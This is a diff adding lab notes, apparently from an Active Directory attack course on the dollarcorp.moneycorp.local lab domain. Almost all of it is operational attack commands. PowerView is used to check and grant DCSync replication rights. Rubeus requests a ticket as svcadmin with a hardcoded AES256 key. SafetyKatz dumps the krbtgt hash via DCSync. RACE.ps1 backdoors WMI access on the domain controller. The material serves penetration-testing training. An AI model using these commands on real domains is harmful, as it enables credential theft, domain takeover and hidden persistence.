@@ -1,1 +1,36 @@
 
+Check if studentx has Replication (DCSync) rights
+We can check if studentx has replication rights using the following commands:
+-> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+->  . C:\AD\Tools\PowerView.ps1
+-> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -
+match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
+
+If the studentx does not have replication rights, let's add the rights. 
+Start a process as Domain Administrator by running the below comman from an elevated command 
+prompt:
+-> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011  /opsec /createnetonly C:\Windows\System32\cmd.exe /show /ptt
+Run the below commands in the new process. Remember to change studentx to your user:
+-> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+->  . C:\AD\Tools\PowerView.ps1
+-> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+Let’s check for the rights once again from a normal shell: student machine shell
+->  Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 
+'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
+
+Sweet! Now, below command (or any similar tool) can be used as studentx to get the hashes of krbtgt 
+user or any other user:
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync 
+/user:dcorp\krbtgt" "exit"
+
+
+
+Once we have administrative privileges on a machine, we can modify security descriptors of services to 
+access the services without administrative privileges. Below command (to be run as Domain 
+Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to 
+WMI
+-> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+->  . C:\AD\Tools\RACE.ps1
+-> Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+-> gwmi -class win32_operatingsystem -ComputerName dcorp-dc
